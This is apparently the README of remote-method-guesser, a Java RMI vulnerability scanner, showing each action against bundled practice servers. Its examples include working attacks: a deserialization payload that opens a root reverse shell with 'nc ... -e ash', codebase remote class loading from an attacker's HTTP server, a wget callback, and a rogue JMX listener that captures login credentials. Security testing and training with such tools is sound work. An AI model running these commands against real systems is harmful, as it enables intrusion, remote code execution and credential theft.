### Remote Method Guesser

---

[![](https://github.com/qtc-de/remote-method-guesser/workflows/master%20maven%20CI/badge.svg?branch=master)](https://github.com/qtc-de/remote-method-guesser/actions/workflows/master.yml)
[![](https://github.com/qtc-de/remote-method-guesser/workflows/develop%20maven%20CI/badge.svg?branch=develop)](https://github.com/qtc-de/remote-method-guesser/actions/workflows/develop.yml)
[![](https://img.shields.io/badge/version-4.0.0-blue)](https://github.com/qtc-de/remote-method-guesser/releases)
[![](https://img.shields.io/badge/build%20system-maven-blue)](https://maven.apache.org/)
![](https://img.shields.io/badge/java-8%2b-blue)
[![](https://img.shields.io/badge/license-GPL%20v3.0-blue)](https://github.com/qtc-de/remote-method-guesser/blob/master/LICENSE)

*remote-method-guesser* (*rmg*) is a *Java RMI* vulnerability scanner and can be used to identify and verify common security
vulnerabilities on *Java RMI* endpoints.

![Remote Method Guesser Example](https://tneitzel.eu/73201a92878c0aba7c3419b7403ab604/rmg-example.gif)

[![BHUSA Arsenal 2021](https://raw.githubusercontent.com/toolswatch/badges/master/arsenal/usa/2021.svg)](https://www.blackhat.com/us-21/arsenal/schedule/#remote-method-guesser-a-java-rmi-vulnerability-scanner-24092)

*remote-method-guesser* was presented at [Black Hat USA2021](https://www.blackhat.com/us-21/arsenal/schedule/#remote-method-guesser-a-java-rmi-vulnerability-scanner-24092)
within the *Arsenal* sessions. The recording of the session and the corresponding slides are publicly available and can be found using the following links:

* Slides: [https://www.slideshare.net/TobiasNeitzel/remotemethodguesser-bhusa2021-arsenal](https://www.slideshare.net/TobiasNeitzel/remotemethodguesser-bhusa2021-arsenal)
* Recording: [https://youtu.be/t_aw1mDNhzI](https://youtu.be/t_aw1mDNhzI)

[![](https://github.com/qtc-de/remote-method-guesser/workflows/example%20server%20-%20master/badge.svg?branch=master)](https://github.com/qtc-de/remote-method-guesser/actions/workflows/master-example-server.yml)
[![](https://github.com/qtc-de/remote-method-guesser/workflows/example%20server%20-%20develop/badge.svg?branch=develop)](https://github.com/qtc-de/remote-method-guesser/actions/workflows/develop-example-server.yml)
[![](https://github.com/qtc-de/remote-method-guesser/workflows/ssrf%20server%20-%20master/badge.svg?branch=master)](https://github.com/qtc-de/remote-method-guesser/actions/workflows/master-ssrf-server.yml)
[![](https://github.com/qtc-de/remote-method-guesser/workflows/ssrf%20server%20-%20develop/badge.svg?branch=develop)](https://github.com/qtc-de/remote-method-guesser/actions/workflows/develop-ssrf-server.yml)

The *remote-method-guesser* repository contains two example servers that can be used to practice *Java RMI* enumeration and attacks.
The [rmg-example-server](/docker/example-server) exposes regular *RMI* services that can be enumerated and exploited using *remote-method-guesser*.
The [rmg-ssrf-server](/docker/ssrf-server) exposes an *HTTP* service that is vulnerable to *SSRF* attacks and runs *RMI* services that are only
listening on localhost. This can be used to practice with *remote-method-guesser's* ``--ssrf`` and ``--ssrf-response`` options.
Both servers are available as containers within the *GitHub Container Registry*:

* [SSRF Server GitHub Package](https://github.com/qtc-de/remote-method-guesser/pkgs/container/remote-method-guesser%2Frmg-ssrf-server)
* [Example Server GitHub Package](https://github.com/qtc-de/remote-method-guesser/pkgs/container/remote-method-guesser%2Frmg-example-server)


### Table of Contents

----

- [Installation](#installation)
- [Supported Operations](#supported-operations)
  + [bind, rebind and unbind](#bind-rebind-and-unbind)
  + [call](#call)
  + [codebase](#codebase)
  + [enum](#enum)
  + [guess](#guess)
  + [known](#known)
  + [listen](#listen)
  + [objid](#objid)
  + [roguejmx](#roguejmx)
  + [scan](#scan)
  + [serial](#serial)
- [More Features](#more-features)
- [Acknowledgements](#acknowledgements)


### Installation

------

*rmg* is a *maven* project and installation should be straight forward. With [maven](https://maven.apache.org/) 
installed, just execute the following commands to create an executable ``.jar`` file:

```console
$ git clone https://github.com/qtc-de/remote-method-guesser
$ cd remote-method-guesser
$ mvn package
```

You can also use prebuild packages that are created for [each release](https://github.com/qtc-de/remote-method-guesser/releases).
Prebuild packages for the development branch are created automatically and can be found on the *GitHub* [actions page](https://github.com/qtc-de/remote-method-guesser/actions).

*rmg* does not include *ysoserial* as a dependency. To enable *ysoserial* support, you need either specify the path
to your ``ysoserial.jar`` file as additional argument (e.g. ``--yso /opt/ysoserial.jar``) or you change the
default path within the [rmg configuration file](./src/config.properties) before building the project.

*rmg* also supports autocompletion for *bash*. To take advantage of autocompletion, you need to have the
[completion-helpers](https://github.com/qtc-de/completion-helpers) project installed. If setup correctly, just
copying the [completion script](./resources/bash_completion.d/rmg) to your ``~/.bash_completion.d`` folder enables
autocompletion.

```console
$ cp resources/bash_completion.d/rmg ~/bash_completion.d/
```


### Supported Operations

-----

In the following, short examples for each available operation are presented. For a more detailed description,
you should read the [documentation folder](./docs) that contains more detailed information on *rmg* and *Java RMI*
in general. All presented examples are based on the [rmg-example-server](https://github.com/qtc-de/remote-method-guesser/pkgs/container/remote-method-guesser%2Frmg-example-server)
and the [rmg-ssrf-server](https://github.com/qtc-de/remote-method-guesser/pkgs/container/remote-method-guesser%2Frmg-ssrf-server).
Both of them are contained within this repository in the [docker](/docker) folder and can be used to practice *Java RMI* enumeration.
You can either build the corresponding containers yourself or load them directly from the *GitHub Container Registry*.

```console
[qtc@devbox ~]$ rmg -h
usage: remote-method-guesser [-h] action ...

rmg v4.0.0 - a Java RMI Vulnerability Scanner

positional arguments:
  action                  
    bind                 Binds an object to the registry thats points to listener
    call                 Regulary calls a method with the specified arguments
    codebase             Perform remote class loading attacks
    enum                 Enumerate common vulnerabilities on Java RMI endpoints
    guess                Guess methods on bound names
    known                Display details of known remote objects
    listen               Open ysoserials JRMP listener
    objid                Print information contained within an ObjID
    rebind               Rebinds boundname as object that points to listener
    roguejmx             Creates a rogue JMX listener (collect credentials)
    scan                 Perform an RMI service scan on common RMI ports
    serial               Perform deserialization attacks against default RMI components
    unbind               Removes the specified bound name from the registry

named arguments:
  -h, --help             show this help message and exit
```


#### bind, rebind and unbind

By using the ``bind``, ``rebind`` or ``unbind`` action, it is possible to modify the available *bound names* within the *RMI registry*.
This is especially useful for verifying ``CVE-2019-2684``, which bypasses the localhost restrictions and enables remote users to perform
bind operations. When using the ``bind`` or ``rebind`` action *remote-method-guesser* binds the ``javax.management.remote.rmi.RMIServerImpl_Stub``
*RemoteObject* by default, which is the *RemoteObject* used by *jmx* servers. Additionally, you need to specify the address of the corresponding
*TCP endpoint* where the *RemoteObject* can be found (address where clients should connect to, when they attempt to use your bound object).

```console
[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 | head -n 11
[+] RMI registry bound names:
[+]
[+] 	- plain-server2
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+] 		    Endpoint: iinsecure.dev:39153 ObjID: [-af587e6:17d6f7bb318:-7ff7, 9040809218460289711]
[+] 	- legacy-service
[+] 		--> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub (unknown class)
[+] 		    Endpoint: iinsecure.dev:39153 ObjID: [-af587e6:17d6f7bb318:-7ffc, 4854919471498518309]
[+] 	- plain-server
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+] 		    Endpoint: iinsecure.dev:39153 ObjID: [-af587e6:17d6f7bb318:-7ff8, 6721714394791464813]

[qtc@devbox ~]$ rmg bind 172.17.0.2 9010 127.0.0.1:4444 my-object --localhost-bypass 
[+] Binding name my-object to javax.management.remote.rmi.RMIServerImpl_Stub
[+]
[+] 	Encountered no Exception during bind call.
[+] 	Bind operation was probably successful.

[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 | head -n 14
[+] RMI registry bound names:
[+]
[+] 	- plain-server2
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+] 		    Endpoint: iinsecure.dev:39153 ObjID: [-af587e6:17d6f7bb318:-7ff7, 9040809218460289711]
[+] 	- my-object
[+] 		--> javax.management.remote.rmi.RMIServerImpl_Stub (known class: JMX Server)
[+] 		    Endpoint: 127.0.0.1:4444 ObjID: [6633018:17cb5d1bb57:-7ff8, -8114172517417646722]
[+] 	- legacy-service
[+] 		--> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub (unknown class)
[+] 		    Endpoint: iinsecure.dev:39153 ObjID: [-af587e6:17d6f7bb318:-7ffc, 4854919471498518309]
[+] 	- plain-server
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+] 		    Endpoint: iinsecure.dev:39153 ObjID: [-af587e6:17d6f7bb318:-7ff8, 6721714394791464813]
```

By using *remote-method-guesser's Plugin System*, it is also possible to bind custom objects to the *RMI registry*. To learn more about
the *Plugin System*, please refer to the [documentation folder](./docs/rmg/plugin-system.md).


#### call

Using *remote-method-guesser's* ``call`` action, you can invoke remote methods without writing any *Java code*. Consider the
method ``String execute(String cmd)`` exists on the remote server. This method sounds promising and you may want to invoke
it using a regular *Java RMI call*. This can be done by using the following command:

```console
[qtc@devbox ~]$ rmg call 172.17.0.2 9010 '"wget 172.17.0.1:8000/worked"' --signature 'String execute(String cmd)' --bound-name plain-server
[qtc@devbox www]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.17.0.2 - - [30/Nov/2021 07:19:06] "GET /worked HTTP/1.1" 200 -
```

Notice that calling remote methods does not create any output by default. To process outputs generated by the ``call`` action, you need
to use *remote-method-guesser's* plugin system and register a ``ResponseHandler``. The [plugin folder](./plugins) of this repository contains
a *GenericPrint* plugin that is suitable for most situations. To learn more about *remote-method-guesser's* plugin system, please refer to the
[detailed documentation folder](./docs/rmg/plugin-system.md).

```console
[qtc@devbox remote-method-guesser]$ bash plugins/build.sh target/rmg-4.0.0-jar-with-dependencies.jar plugins/GenericPrint.java GenericPrint.jar
[qtc@devbox remote-method-guesser]$ rmg call 172.17.0.2 9010 '"id"' --signature 'String execute(String cmd)' --bound-name plain-server --plugin GenericPrint.jar 
[+] uid=0(root) gid=0(root) groups=0(root)
```

During the ``call`` action, the argument string is evaluated as a *Java expression* of the following form: ``new Object[]{ <ARG> }``. Therefore,
you need to make sure that your argument string fits into that pattern. E.g. using ``"id"`` as an argument results in an error, as the argument is
passed as ``id`` to *remote-method-guesser* and the resulting expression ``new Object[]{ id }`` is not a valid *Java expression*. Instead, you need
to use ``'"id"'`` as this leads to ``new Object[]{ "id" }``, which is valid.

Moreover, primitive types need to be specified in their corresponding object representation (e.g. ``new Integer(5)`` instead of ``5``). Otherwise they
cannot be used within the ``Object[]`` array, that is created by the *Java expression*. During the *RMI call*, the corresponding arguments are used
as intended and will fit your specified method signature. For more complex use cases, you can also define a custom ``ArgumentProvider`` by using 
*remote-method-guessers* [plugin system](./docs/rmg/plugin-system.md).


#### codebase

*Java RMI* supports a feature called *codebases*, where the client and the server can specify *URLs* during *RMI calls* that
may be used to load unknown classes dynamically. If an *RMI server* accepts a *client specified codebase*, this can lead to
*remote code execution* when the client provides a malicious *Java* class during the *RMI communication*.

The codebase configuration on an *RMI server* can be different for the different components: *Activator*, *DGC*, *Registry* and *Application Level*.
*remote-method-guesser* allows you to test each component individually by using either ``--signature <method>`` (application level),
``--component act`` (activator), ``--component dgc`` (distributed garbage collector) or ``--component reg`` (RMI registry) together with the
``codebase`` action.

*Application Level*:

```console
[qtc@devbox ~]$ rmg codebase 172.17.0.2 9010 ExampleClass http://172.17.0.1:8000 --signature "String login(java.util.HashMap dummy1)" --bound-name legacy-service
[+] Attempting codebase attack on RMI endpoint...
[+] Using class ExampleClass with codebase http://172.17.0.1:8000/ during login call.
[+]
[+] 	Using non primitive argument type java.util.HashMap on position 0
[+] 	Specified method signature is String login(java.util.HashMap dummy1)
[+]
[+] 	Remote class loader attempted to load dummy class 267eaee13b9e46d2ada471016d693b14
[+] 	Codebase attack probably worked :)
[+]
[+] 	If where was no callback, the server did not load the attack class ExampleClass.class.
[+] 	The class is probably known by the server or it was already loaded before.
[+] 	In this case, you should try a different classname.

[qtc@devbox www]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.17.0.2 - - [30/Nov/2021 07:23:39] "GET /ExampleClass.class HTTP/1.1" 200 -
172.17.0.2 - - [30/Nov/2021 07:23:39] "GET /267eaee13b9e46d2ada471016d693b14.class HTTP/1.1" 404 -
```

*RMI Registry*:

```console
[qtc@devbox ~]$ rmg codebase 172.17.0.2 9010 ExampleClass http://172.17.0.1:8000 --component reg
[+] Attempting codebase attack on RMI Registry endpoint...
[+] Using class ExampleClass with codebase http://172.17.0.1:8000/ during lookup call.
[+]
[+] 	Caught ClassCastException during codebase attack.
[+] 	Codebase attack most likely worked :)

[qtc@devbox www]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.17.0.2 - - [30/Nov/2021 07:26:09] "GET /ExampleClass.class HTTP/1.1" 200 -
```

*Distributed Garbage Collector*:

```console
[qtc@devbox ~]$ rmg codebase 172.17.0.2 9010 ExampleClass http://172.17.0.1:8000 --component dgc
[+] Attempting codebase attack on DGC endpoint...
[+] Using class Example with codebase http://172.17.0.1:8000/ during clean call.
[+] 
[+] 	Caught ClassCastException during codebase attack.
[+] 	Codebase attack most likely worked :)

[qtc@devbox www]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.17.0.2 - - [30/Nov/2021 07:26:53] "GET /ExampleClass.class HTTP/1.1" 200 -
```

*Activator*:

```console
[qtc@devbox ~]$ rmg codebase 172.17.0.2 9010 ExampleClass http://172.17.0.1:8000 --component act
[+] Attempting codebase attack on Activator endpoint...
[+] Using class ExampleClass with codebase http://172.17.0.1:8000/ during activate call.
[+]
[+] 	Caught IllegalArgumentException during codebase attack.
[+] 	Codebase attack was probably successful :)

[qtc@devbox www]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.17.0.2 - - [30/Nov/2021 07:27:13] "GET /ExampleClass.class HTTP/1.1" 200 -
```


#### enum

The ``enum`` action performs several checks on the specified *Java RMI* endpoint and prints the corresponding results. For a
more detailed explanation on the output generated by the ``enum`` action, you can read the corresponding [documentation
page](./docs/rmg/actions.md#enum).

```console
[qtc@devbox ~]$ rmg enum 172.17.0.2 9010
[+] RMI registry bound names:
[+]
[+]   - plain-server2
[+]     --> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+]         Endpoint: iinsecure.dev:42273 ObjID: [-49c48e31:17d6f8692ae:-7ff7, -3079588349672331489]
[+]   - legacy-service
[+]     --> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub (unknown class)
[+]         Endpoint: iinsecure.dev:42273 ObjID: [-49c48e31:17d6f8692ae:-7ffc, -2969569395601583761]
[+]   - plain-server
[+]     --> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+]         Endpoint: iinsecure.dev:42273 ObjID: [-49c48e31:17d6f8692ae:-7ff8, 1319708214331962145]
[+]
[+] RMI server codebase enumeration:
[+]
[+]   - http://iinsecure.dev/well-hidden-development-folder/
[+]     --> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub
[+]     --> de.qtc.rmg.server.interfaces.IPlainServer
[+]
[+] RMI server String unmarshalling enumeration:
[+]
[+]   - Caught ClassNotFoundException during lookup call.
[+]     --> The type java.lang.String is unmarshalled via readObject().
[+]     Configuration Status: Outdated
[+]
[+] RMI server useCodebaseOnly enumeration:
[+]
[+]   - Caught MalformedURLException during lookup call.
[+]     --> The server attempted to parse the provided codebase (useCodebaseOnly=false).
[+]     Configuration Status: Non Default
[+]
[+] RMI registry localhost bypass enumeration (CVE-2019-2684):
[+]
[+]   - Caught NotBoundException during unbind call (unbind was accepeted).
[+]     Vulnerability Status: Vulnerable
[+]
[+] RMI Security Manager enumeration:
[+]
[+]   - Security Manager rejected access to the class loader.
[+]     --> The server does use a Security Manager.
[+]     Configuration Status: Current Default
[+]
[+] RMI server JEP290 enumeration:
[+]
[+]   - DGC rejected deserialization of java.util.HashMap (JEP290 is installed).
[+]     Vulnerability Status: Non Vulnerable
[+]
[+] RMI registry JEP290 bypass enmeration:
[+]
[+]   - Caught IllegalArgumentException after sending An Trinh gadget.
[+]     Vulnerability Status: Vulnerable
[+]
[+] RMI ActivationSystem enumeration:
[+]
[+]   - Caught IllegalArgumentException during activate call (activator is present).
[+]     --> Deserialization allowed  - Vulnerability Status: Vulnerable
[+]     --> Client codebase enabled  - Configuration Status: Non Default
```


#### guess

When using the ``guess`` action, *remote-method-guesser* attempts to identify existing remote methods by sending method hashes
to the remote server. This operation requires a wordlist that contains the corresponding method definitions.
*remote-method-guesser* ships some default wordlists that are included into the ``.jar`` file during the build phase.
You can overwrite wordlist locations by either modifying the [rmg configuration file](./src/config.properties) or by using the ``--wordlist-file``
or ``--wordlist-folder`` options. Methods with zero arguments are skipped during guessing, as they lead to real method calls
on the server side. You can enable guessing on zero argument methods by using the ``--zero-arg`` switch.

```console
[qtc@devbox ~]$ rmg guess 172.17.0.2 9010
[+] Reading method candidates from internal wordlist rmg.txt
[+] 	752 methods were successfully parsed.
[+] Reading method candidates from internal wordlist rmiscout.txt
[+] 	2550 methods were successfully parsed.
[+]
[+] Starting Method Guessing on 3281 method signature(s).
[+]
[+] 	MethodGuesser is running:
[+] 		--------------------------------
[+] 		[ plain-server2  ] HIT! Method with signature String execute(String dummy) exists!
[+] 		[ plain-server2  ] HIT! Method with signature String system(String dummy, String[] dummy2) exists!
[+] 		[ legacy-service ] HIT! Method with signature void logMessage(int dummy1, String dummy2) exists!
[+] 		[ legacy-service ] HIT! Method with signature void releaseRecord(int recordID, String tableName, Integer remoteHashCode) exists!
[+] 		[ legacy-service ] HIT! Method with signature String login(java.util.HashMap dummy1) exists!
[+] 		[6562 / 6562] [#####################################] 100%
[+] 	done.
[+]
[+] Listing successfully guessed methods:
[+]
[+] 	- plain-server2 == plain-server
[+] 		--> String execute(String dummy)
[+] 		--> String system(String dummy, String[] dummy2)
[+] 	- legacy-service
[+] 		--> void logMessage(int dummy1, String dummy2)
[+] 		--> void releaseRecord(int recordID, String tableName, Integer remoteHashCode)
[+] 		--> String login(java.util.HashMap dummy1)
```


#### known

When performing the ``enum`` action, *remote-method-guesser* marks available *bound names* on the *RMI registry* ever
as *known* or as *unknown*. This decision depends on the class that is implemented by the corresponding bound name and
whether the corresponding class is contained within the [known endpoint list](/docs/rmi/known-endpoints.md) that is contained
within the *remote-method-guesser* repository. When a *bound name* is marked as *known*, you can use the ``known`` action
on the corresponding class. Doing so returns information on the corresponding class like the available remote methods,
a general description and possible vulnerabilities:

```console
[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 | head -n 5
[+] RMI registry bound names:
[+]
[+] 	- jmxrmi
[+] 		--> javax.management.remote.rmi.RMIServerImpl_Stub (known class: JMX Server)
[+] 		    Endpoint: iinsecure.dev:41991 ObjID: [6633018:17cb5d1bb57:-7ff8, -8114172517417646722]

[qtc@devbox ~]$ rmg known javax.management.remote.rmi.RMIServerImpl_Stub
[+] Name:
[+] 	JMX Server
[+]
[+] Class Name:
[+] 	- javax.management.remote.rmi.RMIServerImpl_Stub
[+] 	- javax.management.remote.rmi.RMIServer
[+]
[+] Description:
[+] 	Java Management Extensions (JMX) can be used to monitor and manage a running Java virtual machine.
[+] 	This remote object is the entrypoint for initiating a JMX connection. Clients call the newClient
[+] 	method usually passing a HashMap that contains connection options (e.g. credentials). The return
[+] 	value (RMIConnection object) is another remote object that is when used to perform JMX related
[+] 	actions. JMX uses the randomly assigned ObjID of the RMIConnection object as a session id.
[+]
[+] Remote Methods:
[+] 	- String getVersion()
[+] 	- javax.management.remote.rmi.RMIConnection newClient(Object params)
[+]
[+] References:
[+] 	- https://docs.oracle.com/javase/8/docs/technotes/guides/management/agent.html
[+] 	- https://github.com/openjdk/jdk/tree/master/src/java.management.rmi/share/classes/javax/management/remote/rmi
[+]
[+] Vulnerabilities:
[+]
[+] 	-----------------------------------
[+] 	Name:
[+] 		MLet
[+]
[+] 	Description:
[+] 		MLet is the name of an MBean that is usually available on JMX servers. It can be used to load
[+] 		other MBeans dynamically from user specified codebase locations (URLs). Access to the MLet MBean
[+] 		is therefore most of the time equivalent to remote code execution.
[+]
[+] 	References:
[+] 		- https://github.com/qtc-de/beanshooter
[+]
[+] 	-----------------------------------
[+] 	Name:
[+] 		Deserialization
[+]
[+] 	Description:
[+] 		Before CVE-2016-3427 got resolved, JMX accepted arbitrary objects during a call to the newClient
[+] 		method, resulting in insecure deserialization of untrusted objects. Despite being fixed, the
[+] 		actual JMX communication using the RMIConnection object is not filtered. Therefore, if you can
[+] 		establish a working JMX connection, you can also perform deserialization attacks.
[+]
[+] 	References:
[+] 		- https://github.com/qtc-de/beanshooter
```

The list of known classes, their description and the list of known vulnerabilities is far from being complete.
It will hopefully grow in future and is driven by input from other users. If you encounter an *RMI endpoint*
that implements a currently missing class and you have sufficient information (description and available methods),
feel free to create an issue or pull request.


#### listen

Sometimes it is required to provide a malicious *JRMPListener*, which serves deserialization payloads
to incoming *RMI* connections. Writing such a listener from scratch is not necessary, as it is already provided by the
[ysoserial project](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPListener.java).
*remote-method-guesser* provides a wrapper around the *ysoserial* implementation, which lets you spawn a *JRMPListener*
by using the usual *rmg* syntax:

```console
[qtc@devbox ~]$ rmg listen 0.0.0.0 4444 CommonsCollections6 "touch /dev/shm/test"
[+] Creating ysoserial payload... done.
[+] Creating a JRMPListener on 0.0.0.0:4444.
[+] Handing off to ysoserial...
```


#### objid

The ``objid`` action can be used to display more detailed information on an ``ObjID``. Each *RemoteObject* gets assigned
an ``ObjID`` when it is exported by the *RMI runtime*. Knowledge of the ``ObjID`` value is required to communicate with
a *RemoteObject*, which is also the case why you usually need an *RMI registry*. The *RMI registry* contains the ``ObjID``
for each *bound name* and *remote-method-guesser* displays them during the ``enum`` action.

```console
[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 | head -n11
[+] RMI registry bound names:
[+]
[+] 	- plain-server2
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+] 		    Endpoint: iinsecure.dev:40393 ObjID: [-2bc5d969:17d6f8cf44c:-7ff7, 1096154566158180646]
[+] 	- legacy-service
[+] 		--> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub (unknown class)
[+] 		    Endpoint: iinsecure.dev:40393 ObjID: [-2bc5d969:17d6f8cf44c:-7ffc, 625759208507801754]
[+] 	- plain-server
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+] 		    Endpoint: iinsecure.dev:40393 ObjID: [-2bc5d969:17d6f8cf44c:-7ff8, -6355415622579283910]
```

``ObjID`` values consist out of different components. These components are displayed in human readable form when
using the ``objid`` action on the corresponding ``ObjID``:

```console
[qtc@devbox ~]$ rmg objid '[-2bc5d969:17d6f8cf44c:-7ff7, 1096154566158180646]'
[+] Details for ObjID [-2bc5d969:17d6f8cf44c:-7ff7, 1096154566158180646]
[+]
[+] ObjNum: 		1096154566158180646
[+] UID:
[+] 	Unique: 	-734386537
[+] 	Time: 		1638254048332 (Nov 30,2021 07:34)
[+] 	Count: 		-32759
```

Most of the displayed information is not that useful, but the *Time* value can be interesting. This value contains
the time when the *RemoteObject* was created. Therefore, it allows you to determine things like the up-time of an
*RMI* server.


#### scan

Sometimes you identify services that are common to ship *Java RMI* components with them (*JBoss*, *Solr*, *Tomcat*, ...),
but you do not want to perform a full portscan on the corresponding host. In these situations, the ``scan`` action
can be useful. It performs a quick port scan for common *RMI* ports only and attempts to identify *RMI* services
on them:

```console
[qtc@devbox ~]$ rmg scan 172.17.0.2
[+] Scanning 112 Ports on 172.17.0.2 for RMI services.
[+]
[+] 	[HIT] Found RMI service(s) on 172.17.0.2:9010  (Registry, Activator, DGC)
[+] 	[HIT] Found RMI service(s) on 172.17.0.2:1090  (Registry, DGC)
[+] 	[119 / 119] [#############################] 100%
[+]
[+] Portscan finished.
```

The ``scan`` action uses *remote-method-guesser's* port argument as an indicator which ports to scan. Using ``-``
as a port value results in a scan for all common *RMI* ports. You can also specify numbers, ranges and lists.
Additionally, you can specify further port specifications after the ``scan`` action:

```console
[qtc@devbox ~]$ rmg scan 172.17.0.2 --ports 0-100 1000-1100 9000-9020 35000-36000 40000-45000
[+] Scanning 6225 Ports on 172.17.0.2 for RMI services.
[+]
[+] 	[HIT] Found RMI service(s) on 172.17.0.2:40393 (DGC)
[+] 	[HIT] Found RMI service(s) on 172.17.0.2:1090  (Registry, DGC)
[+] 	[HIT] Found RMI service(s) on 172.17.0.2:9010  (Registry, Activator, DGC)
[+] 	[6234 / 6234] [#############################] 100%
[+]
[+] Portscan finished.
```

Notice that the ``scan`` action is implemented in a simple and non reliable way. If possible, you should
always perform a dedicated portscan using tools like [nmap](https://nmap.org/). However, the ``scan`` action
can give you a quick heads-up on finding *RMI ports*.


#### roguejmx

The ``roguejmx`` actions creates a *JMX listener* on your system that captures credentials of incoming connections.
After creating the listener, *remote-method-guesser* prints the *ObjID* value that is required to interact with it.

```console
[qtc@devbox ~]$ rmg roguejmx 172.17.0.1 4444
[+] Statring RogueJMX Server on 172.17.0.1:4444
[+] 	--> Assigned ObjID is: [6633018:17cb5d1bb57:-7ff8, -8114172517417646722]
```

Using the ``bind`` and ``rebind`` operations you can inject this listener into an *RMI registry* and wait for other
users connecting to your server:

```console
[qtc@devbox ~]$ rmg bind 172.17.0.2 9010 172.17.0.1:4444 jmxrmi --bind-objid '[6633018:17cb5d1bb57:-7ff8, -8114172517417646722]' --localhost-bypass
[+] Binding name jmxrmi to javax.management.remote.rmi.RMIServerImpl_Stub
[+]
[+] 	Encountered no Exception during bind call.
[+] 	Bind operation was probably successful.

[qtc@kali ~]$ jconsole # Connect to 172.17.0.2:9010 with credentials
```

Incoming connections are logged by the listener:

```console
[qtc@devbox ~]$ rmg roguejmx 172.17.0.1 4444
[+] Statring RogueJMX Server on 172.17.0.1:4444
[+] 	--> Assigned ObjID is: [6633018:17cb5d1bb57:-7ff8, -8114172517417646722]
[+]
[+] Got incoming call for newClient(...)
[+] 	Username: admin
[+] 	Password: s3crEt!
```

*remote-method-guesser* uses the *ObjID* value ``[6633018:17cb5d1bb57:-7ff8, -8114172517417646722]`` by default for *bind* operations
and the rouge *JMX* server. Specifying the *ObjID* manually as shown above is therefore not necessary. You can change the default
*ObjID* value either via command line arguments or within *remote-method-guesser's* configuration file.

The rogue *JMX* server returns an access exception (invalid credentials) for each incoming connection by default, but
you can also forward incoming connections to a different *JMX* instance. This makes it possible to obtain credentials
from incoming client connections without disrupting any services. To forward connections, you have to specify the
corresponding target as an additional argument. Targets can be specified in two different ways:

1. The IP address and port of an RMI registry together with the bound name of the corresponding *JMX instance*:
   ```console
  [qtc@devbox ~]$ rmg roguejmx 172.17.0.1 4444 --forward-host 172.17.0.2 --forward-port 9010 --forward-bound-name jmxrmi 
  [+] Statring RogueJMX Server on 172.17.0.1:4444
  [+] 	--> Assigned ObjID is: [6633018:17cb5d1bb57:-7ff8, -8114172517417646722]
  [+] 	--> Forwarding connections to: 172.17.0.2:9010:jmxrmi
  [+]
  ```

2. The IP address and port of the *JMX* service itself together with it's *ObjID* value:
   ```console
  [qtc@devbox ~]$ rmg roguejmx 172.17.0.1 4444 --forward-host 172.17.0.2 --forward-port 41001 --forward-objid '[-40935072:17cd9fc77c4:-7ff8, 6731522247396892423]'
  [+] Statring RogueJMX Server on 172.17.0.1:4444
  [+] 	--> Assigned ObjID is: [6633018:17cb5d1bb57:-7ff8, -8114172517417646722]
  [+] 	--> Forwarding connections to: 172.17.0.2:41001:[-40935072:17cd9fc77c4:-7ff8, 6731522247396892423]
  [+]
  ```

#### serial

*Java RMI* uses *Java serialized objects* within the client server communication. This makes it potentially vulnerable
to *deserialization attacks*. These attacks can target different *RMI components*:

* Well known *RMI components* (*RMI internals*)
  * *RMI registry*
  * *DGC*
  * *Activator*
* User defined *RemoteObjects* (*Application level*)


##### Well Known RMI Components

Whereas modern *RMI servers* apply *deserialization filters* on these *well known RMI components* (*JEP290*), older servers may still be vulnerable to *deserialization
attacks*. *remote-method-guesser* allows to verify this by using the ``serial`` action, that can perform deserialization attacks on the *Activator*, *Distributed
Garbage Collector* (*DGC*) or the *RMI registry*.

```console
[qtc@devbox ~]$ rmg serial 172.17.0.2 9010 CommonsCollections6 'nc 172.17.0.1 4444 -e ash' --component reg
[+] Creating ysoserial payload... done.
[+]
[+] Attempting deserialization attack on RMI Registry endpoint...
[+]
[+] 	Caught ClassCastException during deserialization attack.
[+] 	Deserialization attack was probably successful :)

[qtc@devbox ~]$ nc -vlp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:46209.
id
uid=0(root) gid=0(root) groups=0(root)
```

In case of the *RMI registry*, the *deserialization filters* may be bypassed by using the [JRMPClient](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/JRMPClient.java)
or the [An Trinh](https://mogwailabs.de/en/blog/2020/02/an-trinhs-rmi-registry-bypass/) bypass gadgets. These gadgets create an *outbound RMI channel*
that does no longer apply *deserialization filters*. On this channel, deserialization attacks can be applied as usual, but both bypasses were patched
in the most recent versions of *Java RMI*.

```console
[qtc@devbox ~]$ rmg serial 172.17.0.2 9010 AnTrinh 172.17.0.1:4444 --component reg 
[+] Attempting deserialization attack on RMI Registry endpoint...
[+]
[+] 	Caught javax.management.BadAttributeValueExpException during deserialization attack.
[+] 	This could be caused by your gadget an the attack probably worked anyway.
[+] 	If it did not work, you can retry with --stack-trace to see the details.

